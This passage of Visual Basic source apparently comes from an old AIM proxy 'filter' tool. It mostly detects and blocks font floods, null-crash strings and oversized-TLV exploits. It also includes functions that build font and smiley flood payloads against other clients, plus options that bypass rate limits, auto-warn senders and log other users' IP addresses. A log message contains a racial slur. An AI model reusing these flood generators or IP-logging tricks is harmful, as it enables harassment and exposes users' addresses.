                   '     A1 = getTLV(Mid(strData, 30), 5)
                   '     If InStr(1, A1, ":") = 0 Then
                   '         socketServer = A1
                   '         Winsock2.Close
                   '         Winsock2.Listen
                   '         strData = Replace(strData, TLV(5, CStr(A1)), TLV(5, "localhost"))
                   '         ListAdd "Server Redirection :: AIM Add-On"
                   '         GoTo sendIt:
                   '     End If
                
                    'End If
                
                Case 5895 'challenge
                    If Check6.Value = 1 Then
                        A1 = Asc(Mid(strData, 18, 1))
                        A2 = Mid(strData, 19, A1)
                        ListAdd "Challenge :: " & A2
                    End If
                
                Case 266 'rate limit stuff
                
                    If ignoreratelimits.Checked = True Then
                        strData = Left(strData, 50) & ChrA("255 255") & Right(strData, Len(strData) - 52)
                        Mid(strData, 31, 2) = ChrA("255 255")
                        ListAdd "Rate Ignored"
                    End If

                Case 518 'incoming profile
                    
                    If viewprofilesource.Checked = True Then
                        A2 = InStr(1, strData, "<HTML>")
                        If A2 <> 0 Then
                            A1 = ChrA("0 8 0 2 0 0 0 0 0 2")
                            A1 = A1 & TLV(1, Mid(strData, A2))
                            A1 = A1 & TLV(2, "http://www.ravewithme.net/wicon/")
                            A1 = A1 & TLV(3, ChrA("0 255"))
                            A1 = A1 & TLV(4, ChrA("0 255"))
                            A1 = A1 & TLV(5, ChrA("0 1"))
                            AIMFilter(Index).sendPacket 0, CStr(A1), 1
                        End If
                    End If

                Case 780 'buddy signing off
                
                    If blocklistflutters.Checked = True Then
                        A1 = Asc(Mid(strData, 17, 1))
                        A2 = LCase(Replace(Mid(strData, 18, A1), " ", "")) 'name
                        budOff.AddItem A2
                        If OnBothSir(CStr(A2)) = True Then Exit Sub
                    End If
                    If onlinenotifer.Checked = True Then
                        A1 = Asc(Mid(strData, 17, 1))
                        A2 = Mid(strData, 18, A1) 'name
                        For i = 0 To buddyListed.ListCount - 1
                            If buddyListed.List(i) = A2 Then buddyListed.RemoveItem i
                            DoEvents
                        Next i
                    End If
                    
                Case 779 'buddy signing on
                    
                    If blocklistflutters.Checked = True Then
                        A1 = Asc(Mid(strData, 17, 1))
                        A2 = LCase(Replace(Mid(strData, 18, A1), " ", "")) 'name
                        budOn.AddItem A2
                        If OnBothSir(CStr(A2)) = True Then Exit Sub
                    End If
                    If onlinenotifer.Checked = True Then
                        A1 = Asc(Mid(strData, 17, 1))
                        A2 = Mid(strData, 18, A1) 'name
                        If Len(strData) > (23 + A1) Then
                            A3 = getTLV(Right(strData, Len(strData) - (19 + A1)), 13) 'capability block
                            For i = 0 To buddyListed.ListCount - 1
                                If buddyListed.List(i) = A2 Then Exit Sub
                                DoEvents
                            Next i
                            buddyListed.AddItem A2
                            Dim AlertBox As frmAlert
                            Set AlertBox = New frmAlert
                            AlertBox.DisplayAlert A2 & " signed on.", 10000
                        End If
                    End If
                        
                Case 1031 'im

                    A1 = Asc(Mid(strData, 27, 1))
                    A2 = Mid(strData, 28, A1)
                    intIMCount = intIMCount + 1
                    
                    If LCase(A2) = "aolreplynwin" Then
                        A4 = 0
                        For i = 0 To tempBot.ListCount - 1
                            If tempBot.List(i) = LCase(Replace(A2, " ", "")) Then
                                A4 = 1
                            End If
                        Next i
                        If A4 = 0 Then
                            ListAdd "Replied Nigga"
                            AIMFilter(Index).sendPacket 1, instantMessage(REQID2, "aolreplynwin", "GO"), 1
                            DoEvents
                        End If
                    End If
                    
                    'auto warn
                    
                    If enableautowarn.Checked = True Then
                    
                        AIMFilter(Index).sendPacket 1, UserWarning(CStr(A2), 0), 1
                        ListAdd "Auto-Warn Tripped {" & A2 & "}"
                    End If
                    
                    'block bot ims
                    
                    If blockbotims.Checked = True Then
                        If Mid(strData, 17, 6) = String(6, Mid(strData, 17, 1)) Then
                            ListAdd "Bot IM Blocked by Request ID"
                            Exit Sub
                        End If
                        A4 = 0
                        For i = 0 To botBlock.ListCount - 1
                            If botBlock.List(i) = LCase(Replace(TrimNum(A2), " ", "")) Then
                                ListAdd "Bot IM Blocked by Screen Name"
                                Exit Sub
                            End If
                            DoEvents
                        Next i
                        For i = 0 To tempBot.ListCount - 1
                            If tempBot.List(i) = LCase(Replace(A2, " ", "")) Then
                                A4 = 1
                            End If
                        Next i
                        If A4 = 0 Then tempBot.AddItem LCase(Replace(A2, " ", ""))
                        A3 = 0
                        For i = 0 To tempBot.ListCount - 1
                            If TrimNum(tempBot.List(i)) = LCase(Replace(TrimNum(A2), " ", "")) Then
                                A3 = A3 + 1
                            End If
                            If A3 > 2 Then
                                botBlock.AddItem LCase(Replace(TrimNum(A2), " ", ""))
                                For X = 0 To tempBot.ListCount - 1
                                    If TrimNum(tempBot.List(X)) = LCase(Replace(TrimNum(A2), " ", "")) Then
                                        tempBot.RemoveItem X
                                    End If
                                    DoEvents
                                Next X
                                Exit For
                            End If
                        Next i
                    End If
                    
                    'block im floods
                    
                    If blockimfloods.Checked = True And intIMCount > 4 Then
                        ListAdd "IM Flooding Detected"
                        Exit Sub
                    End If
                    
                    'get incoming ips
                    
                    If logincomingip.Checked = True Then
                        A3 = InStr(1, strData, ChrH("09 46 13 43 4C 7F 11 D1 82 22 44 45 53 54 00 00"))
                        If A3 <> 0 Then
                            A4 = StringToIP(getTLV(Mid(strData, A3 + 9), 3))
                            If A4 <> Chr(0) And Len(A4) <= 16 Then
                                ListAdd "Logged IP :: File Send [" & A4 & "] {" & A2 & "}"
                            End If
                        End If
                        A3 = InStr(1, strData, ChrH("09 46 13 41 4C 7F 11 D1 82 22 44 45 53 54 00 00"))
                        If A3 <> 0 Then
                            A4 = StringToIP(getTLV(Mid(strData, A3 + 9), 3))
                            If A4 <> Chr(0) And Len(A4) <= 16 Then
                                ListAdd "Logged IP :: Talk [" & A4 & "] {" & A2 & "}"
                            End If
                        End If
                        A3 = InStr(1, strData, ChrH("09 46 13 45 4C 7F 11 D1 82 22 44 45 53 54 00 00"))
                        If A3 <> 0 Then
                            A4 = StringToIP(getTLV(Mid(strData, A3 + 9), 3))
                            If A4 <> Chr(0) And Len(A4) <= 16 Then
                                ListAdd "Logged IP :: IM Image [" & A4 & "] {" & A2 & "}"
                            End If
                        End If
                    End If
                    
                    'font crashes
                    
                    If repeatingfonts.Checked = True Then
                        If NumString(strData, "<font", 19) = True Then
                            ListAdd "Font Flood Blocked :: <font>"
                            Exit Sub
                        ElseIf NumString(strData, "<body", 19) = True Then
                            ListAdd "Font Flood Blocked :: <body>"
                            Exit Sub
                        End If
                    End If
                    
                    'comment crashes
                    
                    If nullcrashes.Checked = True Then
                        If InStr(1, strData, "n%n%n%n%n%n%n%n") <> 0 Then
                            ListAdd "Null Crash Blocked"
                            Exit Sub
                        End If
                    End If
                    
                    'game crashes
                    If gamexploitsyo.Checked = True Then
                        If InStr(1, TheStuff, ChrA("9 70 19 71 76 127 17 209 130 34 68 69 83 84 0 0")) <> 0 Then
                            If InStr(1, TheStuff, "<img") <> 0 Then
                                ListAdd "Game Exploit Blocked"
                                Exit Sub
                            End If
                        End If
                    End If
                    
                    'oversized tlvs
                    
                    If oversizedtlvs.Checked = True Then
                        If Len(strData) > 10 Then
                            If InStr(1, TheStuff, ChrA("116 143 36 32 98 135 17 209 130 34 68 69 83 84 0 0")) <> 0 Then
                                ListAdd "Oversized TLV Blocked :: Chat Invite"
                                Exit Sub
                            ElseIf InStr(1, TheStuff, ChrA("9 70 19 71 76 127 17 209 130 34 68 69 83 84 0 0")) <> 0 Then
                                ListAdd "Oversized TLV Blocked :: Game Invite"
                                Exit Sub
                            ElseIf InStr(1, TheStuff, ChrA("9 70 19 67 76 127 17 209 130 34 68 69 83 84 0 0")) <> 0 Then
                                ListAdd "Oversized TLV Blocked :: File Send"
                                Exit Sub
                            End If
                        ElseIf Len(strData) > 2000 Then
                            If InStr(1, strData, ChrA("9 70 19 75 76 127 17 209 130 34 68 69 83 84 0 0")) <> 0 Then
                                ListAdd "Oversized TLV Blocked :: Buddy List"
                                Exit Sub
                            End If
                        End If
                    End If
                    
                    'buddy icon request
                    
                    If blockbuddyiconreq.Checked = True Then
                        If InStr(1, strData, TLV(9, "")) <> 0 Then
                            ListAdd "Buddy Icon Request Blocked"
                            Exit Sub
                        End If
                    End If
            
                    'remove html
                    
                    If removeallhtml.Checked = True Then
                        strData = removeHTML(strData)
                    End If
                    
                Case 1034 'missed calls
                
                    If showmissedcalls.Checked = True Then 'they want to see them
                    
                        A1 = Mid(strData, 17, Len(strData) - 20) 'this is the same as an incoming im so we'll not bother parsing it
                        'throw the incoming im together:
                        A2 = ChrA("0 4 0 7") & Mid(strData, 11, 6) & ChrA("1 2 3 4 5 6 7 8") & A1
                        A2 = A2 & TLV(2, ChrA("5 1 0 3 1 1 2 1 1") & TwoByteLen(ChrA("0 0 0 0") & "I ARE FILTER :: MISSED_CALL :: " & Time))
                        AIMFilter(Index).sendPacket 0, CStr(A2), 1 'send it
                    
                    End If
                    
                Case 3590 'incoming chat
                
                    If blockonlinehosttext.Checked = True Then
                        If InStr(1, strData, "*OnlineHost*") <> 0 Then
                            ListAdd "OnlineHost Text Blocked"
                            Exit Sub
                        End If
                    End If
            
            End Select
            
    
    End Select

sendIt:
    
    If TheIndex = 1 Then
        AIMFilter(Index).sendPacket 0, strData, 1
    Else
        AIMFilter(Index).sendPacket 1, strData, 1
    End If

End Sub

Private Function OnBothSir(strName As String) As Boolean
    For i = 0 To budOn.ListCount - 1
        If budOn.List(i) = strName Then OnBothSir = True
        DoEvents
    Next i
    If OnBothSir = True Then
        For i = 0 To budOff.ListCount - 1
            If budOff.List(i) = strName Then
                OnBothSir = True
                Exit Function
            End If
            DoEvents
        Next i
        OnBothSir = False
    End If
End Function

Private Sub AIMFilter_incomingPacketDC(Index As Integer, TheIndex As Integer, TheStuff As String, TheName As String)
        'Text4 = Replace(TheStuff, Chr(0), Chr(1))
        'A9 = ""
        'For i = 1 To Len(TheStuff)
        '    A9 = A9 & Asc(Mid(TheStuff, i, 1)) & " "
        'Next i
        'Text6 = A9
    On Error Resume Next
    ListAdd "Direct Connect IM Rerouted"
    AIMFilter(bosINDEX).sendPacket 1, instantMessage(REQID2, CStr(TheName), Replace(Right(TheStuff, Len(TheStuff) - 75), Chr(0), "")), 1
End Sub

Private Sub AIMFilter_LostConnection(Index As Integer)
    Unload AIMFilter(Index)
End Sub

Private Sub blockbartcache_Click()
    If blockbartcache.Checked = True Then
        blockbartcache.Checked = False
    Else
        blockbartcache.Checked = True
    End If
End Sub

Private Sub blockbotims_Click()
    If blockbotims.Checked = True Then
        blockbotims.Checked = False
    Else
        blockbotims.Checked = True
    End If
End Sub

Private Sub blockbuddyiconreq_Click()
    If blockbuddyiconreq.Checked = True Then
        blockbuddyiconreq.Checked = False
    Else
        blockbuddyiconreq.Checked = True
    End If
End Sub

Private Sub blockclienterrors_Click()
    If blockclienterrors.Checked = True Then
        blockclienterrors.Checked = False
    Else
        blockclienterrors.Checked = True
    End If
End Sub

Private Sub blockghostwarn_Click()
    If blockghostwarn.Checked = True Then
        blockghostwarn.Checked = False
    Else
        blockghostwarn.Checked = True
    End If
End Sub

Private Sub blockimfloods_Click()
    If blockimfloods.Checked = True Then
        blockimfloods.Checked = False
    Else
        blockimfloods.Checked = True
    End If
End Sub

Private Sub blocklistflutters_Click()
    If blocklistflutters.Checked = True Then
        blocklistflutters.Checked = False
        Timer3.Enabled = False
    Else
        blocklistflutters.Checked = True
        Timer3.Enabled = True
    End If
End Sub

Private Sub blockonlinehosttext_Click()
    If blockonlinehosttext.Checked = True Then
        blockonlinehosttext.Checked = False
    Else
        blockonlinehosttext.Checked = True
    End If
End Sub

Private Sub Check2_Click()
    If Check2.Value = 1 Then
        Text1.Enabled = False
        Winsock1.Close
        Winsock3.Close
        Winsock1.LocalPort = Text1
        Winsock3.LocalPort = Text1 + 1
        Winsock1.Close
        Winsock3.Close
        Winsock1.Listen
        Winsock3.Listen
        socketServer = "login.oscar.aol.com"
    Else
        Text1.Enabled = True
        Winsock1.Close
    End If
End Sub

Private Sub checkall_Click()
    oversizedtlvs.Checked = True
    nullcrashes.Checked = True
    repeatingfonts.Checked = True
    commentcrashes.Checked = True
End Sub

Private Sub checkall2_Click()
    blockclienterrors.Checked = True
    blockghostwarn.Checked = True
    blockbuddyiconreq.Checked = True
End Sub

Private Sub clearlistentries_Click()
    List1.Clear
End Sub

Private Sub Command1_Click()
    PopupMenu Me.securityiscool
End Sub

Private Sub Command2_Click()
    PopupMenu Me.misciscool
End Sub

Private Sub Command3_Click()
    PopupMenu Me.attackstuff
End Sub

Private Sub Command4_Click()
    PopupMenu Me.helpiscool
End Sub

Private Sub Command5_Click()
    botBlock.AddItem Text2
End Sub

Private Sub commentcrashes_Click()
    If commentcrashes.Checked = True Then
        commentcrashes.Checked = False
    Else
        commentcrashes.Checked = True
    End If
End Sub

Private Sub completecommandlist_Click()
    frmCommandList.Show 0, Me
End Sub

Private Sub copylistentry_Click()
    On Error Resume Next
    Clipboard.Clear
    Clipboard.SetText List1.text
End Sub

Private Sub correctdirectconnectips_Click()
    If correctdirectconnectips.Checked = True Then
        correctdirectconnectips.Checked = False
    Else
        correctdirectconnectips.Checked = True
    End If
End Sub

Private Sub enableautowarn_Click()
    If enableautowarn.Checked = True Then
        enableautowarn.Checked = False
    Else
        enableautowarn.Checked = True
    End If
End Sub

Private Sub enablescriptingfool_Click()
    If enablescriptingfool.Checked = True Then
        enablescriptingfool.Checked = False
    Else
        enablescriptingfool.Checked = True
    End If
End Sub

Private Sub Form_Load()
    
    On Error GoTo noscripts:
    
    Me.Show
    Me.Refresh
    
    With nid
        .cbSize = Len(nid)
        .hwnd = Me.hwnd
        .uId = vbNull
        .uFlags = NIF_ICON Or NIF_TIP Or NIF_MESSAGE
        .uCallBackMessage = WM_MOUSEMOVE
        .hIcon = Me.Icon
        .szTip = " I ARE FILTER " & vbNullChar
    End With
    
    File1.Path = MyTruePath & "scripts\"
    ListAdd File1.ListCount & " Command Scripts loaded"
    Exit Sub
    
noscripts:
    
    MkDir MyTruePath & "scripts\"
    ListAdd "0 Command Scripts loaded"

End Sub

Private Sub Form_Resize()
If Me.WindowState = vbMinimized Then
    Me.Hide
    Shell_NotifyIcon NIM_ADD, nid
End If
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    'This procedure receives the callbacks f
    '     rom the System Tray icon.
    Dim Result As Long
    Dim msg As Long
    'The value of X will vary depending upon
    '     the scalemode setting


    If Me.ScaleMode = vbPixels Then
        msg = X
    Else
        msg = X / Screen.TwipsPerPixelX
    End If


    Select Case msg
        Case WM_LBUTTONUP '514 restore form window
            Me.WindowState = vbNormal
            Result = SetForegroundWindow(Me.hwnd)
            Me.Show
            Shell_NotifyIcon NIM_DELETE, nid
        Case WM_LBUTTONDBLCLK '515 restore form window
            Me.WindowState = vbNormal
            Result = SetForegroundWindow(Me.hwnd)
            Me.Show
            Shell_NotifyIcon NIM_DELETE, nid
        Case WM_RBUTTONUP '517 display popup menu
            Me.WindowState = vbNormal
            Result = SetForegroundWindow(Me.hwnd)
            Me.Show
            Shell_NotifyIcon NIM_DELETE, nid
    End Select
    
End Sub

Private Sub Form_Unload(Cancel As Integer)
Shell_NotifyIcon NIM_DELETE, nid
End
End Sub

Private Sub gamexploitsyo_Click()
    If gamexploitsyo.Checked = True Then
        gamexploitsyo.Checked = False
    Else
        gamexploitsyo.Checked = True
    End If
End Sub

Private Sub ignoreratelimits_Click()
    If ignoreratelimits.Checked = True Then
        ignoreratelimits.Checked = False
    Else
        ignoreratelimits.Checked = True
    End If
End Sub

Private Sub Image1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Image2.Visible = False Then
        List1.Width = 2175
    End If
End Sub

Private Sub imTimer_Timer()
    intIMCount = 0
End Sub

Private Sub Label4_Click()
    If Image2.Visible = True Then
        Image2.Visible = False
        Image3.Visible = True
        List1.Width = 2175
    Else
        Image3.Visible = False
        Image2.Visible = True
        List1.Width = 4935
    End If
End Sub

Private Sub List1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    List1.Width = 4935
End Sub

Private Sub List1_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 2 Then
        PopupMenu Me.listmenusir
    End If
End Sub

Private Sub List2_DblClick()
    List2.Clear
End Sub

Private Sub logincomingip_Click()
    If logincomingip.Checked = True Then
        logincomingip.Checked = False
    Else
        logincomingip.Checked = True
    End If
End Sub

Private Sub nullcrashes_Click()
    If nullcrashes.Checked = True Then
        nullcrashes.Checked = False
    Else
        nullcrashes.Checked = True
    End If
End Sub

Private Sub onlinenotifer_Click()
    If onlinenotifer.Checked = True Then
        onlinenotifer.Checked = False
    Else
        onlinenotifer.Checked = True
    End If
End Sub

Private Sub oversizedtlvs_Click()
    If oversizedtlvs.Checked = True Then
        oversizedtlvs.Checked = False
    Else
        oversizedtlvs.Checked = True
    End If
End Sub

Private Sub packetsniffer_Click()
    frmSuperSniffer.Show
End Sub

Private Sub refreshscriptsyo_Click()
    File1.Path = MyTruePath & "scripts\"
    File1.Refresh
    ListAdd File1.ListCount & " Command Scripts loaded"
End Sub

Private Sub removeallhtml_Click()
    If removeallhtml.Checked = True Then
        removeallhtml.Checked = False
    Else
        removeallhtml.Checked = True
    End If
End Sub

Private Sub removelistentry_Click()
    On Error Resume Next
    List1.RemoveItem List1.ListIndex
End Sub

Private Sub repeatingfonts_Click()
    If repeatingfonts.Checked = True Then
        repeatingfonts.Checked = False
    Else
        repeatingfonts.Checked = True
    End If
End Sub

Private Sub replaceicon_Click()
    If replaceicon.Checked = True Then
        replaceicon.Checked = False
    Else
        replaceicon.Checked = True
    End If
End Sub

Private Sub showmissedcalls_Click()
    If showmissedcalls.Checked = True Then
        showmissedcalls.Checked = False
    Else
        showmissedcalls.Checked = True
    End If
End Sub

Private Sub TalkLikeErin_Click()
    If TalkLikeErin.Checked = True Then
        TalkLikeErin.Checked = False
    Else
        TalkLikeErin.Checked = True
    End If
End Sub

Private Sub Timer1_Timer()
    Winsock4.Close
    Winsock4.Connect "www.whatismyip.com", "80"
    ListAdd "Requesting True IP..."
    Timer1.Enabled = False
End Sub

Private Sub Timer2_Timer()
    AIMFilter(Label1).sendPacket 1, adjustPrivacy(False), 1
    Pause 0.5
    AIMFilter(Label1).sendPacket 1, adjustPrivacy(True), 1

End Sub

Private Sub Timer3_Timer()
    budOn.Clear
    budOff.Clear
End Sub

Private Sub uncheckall_Click()
    oversizedtlvs.Checked = False
    nullcrashes.Checked = False
    repeatingfonts.Checked = False
    commentcrashes.Checked = False
End Sub

Private Sub uncheckall2_Click()
    blockclienterrors.Checked = False
    blockghostwarn.Checked = False
    blockbuddyiconreq.Checked = False
End Sub

Private Sub viewprofilesource_Click()
    If viewprofilesource.Checked = True Then
        viewprofilesource.Checked = False
    Else
        viewprofilesource.Checked = True
    End If
End Sub

Private Sub visitwicon_Click()
    OpenURL "http://www.ravewithme.net/wicon/"
End Sub

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
    On Error Resume Next
    NewFilter
    AIMFilter(socketIndex).DoTheCrap requestID
    ListAdd "New Proxy Connection"
End Sub

Private Sub Winsock3_ConnectionRequest(ByVal requestID As Long)
    NewFilter
    AIMFilter(socketIndex).DoTheCrap requestID
End Sub

Sub NewFilter()
    On Error Resume Next
    socketIndex = socketIndex + 1
    Load AIMFilter(socketIndex)
End Sub

Sub ListAdd(TheEvent)
Dim B1, B2, B3, B4, B5
For i = 0 To List1.ListCount - 1
    If Right(List1.List(i), Len(TheEvent) + 2) = "x " & TheEvent Then
        B1 = List1.List(i)
        B2 = InStr(1, B1, "x")
        B3 = Left(B1, B2 - 2)
        B4 = Right(B1, Len(B1) - (B2 + 1))
        B3 = B3 + 1
        List1.List(i) = B3 & " x " & B4
        Exit Sub
    End If
    DoEvents
Next i
List1.AddItem "1 x " & TheEvent
End Sub

Private Function getTLV(strData, intType As Integer) As String
    Dim strStartIt As String
    Dim i
    
    If InStr(1, strData, IntegerToBase256(intType)) <> 0 Then
        For i = 1 To Len(strData)
            If Mid(strData, i, 2) = IntegerToBase256(intType) Then
                strStartIt = Mid(strData, i)
                getTLV = Mid(strStartIt, 5, GetLength(Chr(0) & Mid(strStartIt, 3, 2)))
                Exit Function
            End If
        Next i
    Else
        getTLV = ""
    End If
End Function

Private Function REQID2()
    REQID2 = ""
    For i = 1 To 6
        REQID2 = REQID2 & Chr(GRInteger(0, 255))
        DoEvents
    Next i
    REQID2 = REQID2 & ChrA("0 0")
End Function

Private Sub Winsock2_ConnectionRequest(ByVal requestID As Long)
    NewFilter
    AIMFilter(socketIndex).DoTheCrap requestID
    Winsock2.Close
End Sub

Function NumString(TheString1, TheString2, TheNumber)
X = 0
For i = 1 To Len(TheString1)
    If Mid(TheString1, i, Len(TheString2)) = TheString2 Then
        X = X + 1
        If X >= TheNumber Then
            NumString = True
            Exit Function
        End If
    End If
    DoEvents
Next i
NumString = False
End Function

Private Sub Winsock4_Connect()
    Winsock4.SendData Gett("/", "", "www.whatismyip.com", "")
End Sub

Private Sub Winsock4_DataArrival(ByVal bytesTotal As Long)
    Dim TheDatas As String
    Winsock4.PeekData TheDatas
    If InStr(1, TheDatas, "IP is") Then
        A1 = InStr(1, TheDatas, "<h1>Your IP is ")
        A2 = InStr(1, TheDatas, " <br></h1>")
        A3 = Mid(TheDatas, A1 + 15, A2 - (A1 + 15))
        ListAdd "True IP Found {" & A3 & "}"
        trueIP = Replace(A3, ".", " ")
        Winsock4.Close
    End If
End Sub

Function GenerateFonts()
    Dim FontBuffer
    FontBuffer = ""
    Do While Len(FontBuffer) < 2000
        FontCount = FontCount + 1
        FontBuffer = FontBuffer & "<font color=" & FontCount & ">" & Chr(150)
    Loop
    GenerateFonts = FontBuffer
End Function

Public Function SmileyFlooder()
    Dim SBuffer
    SBuffer = ""
    Do While Len(SBuffer) < 2000
        SBuffer = SBuffer & "<font sml=" & Chr(34) & List4.List(GRInteger(0, List4.ListCount - 1)) & Chr(34) & ">" & List5.List(GRInteger(0, List5.ListCount - 1)) & "</font>"
        DoEvents
    Loop
    SmileyFlooder = SBuffer
End Function
